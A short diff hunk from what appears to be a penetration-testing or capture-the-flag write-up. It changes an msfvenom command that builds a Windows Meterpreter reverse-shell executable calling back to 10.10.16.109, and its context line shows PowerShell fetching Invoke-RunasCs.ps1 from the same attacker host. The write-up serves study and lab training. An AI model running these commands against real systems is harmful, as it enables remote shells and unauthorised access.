@@ -269,7 +269,7 @@ PS C:\Users\Public> Invoke-WebRequest "http://10.10.16.109:8000/Invoke-RunasCs.p
 
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.16.109 -f exe -o rev.exe LPORT=9999
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.109 -f exe -o rev.exe LPORT=9999
 ```
 
 ```
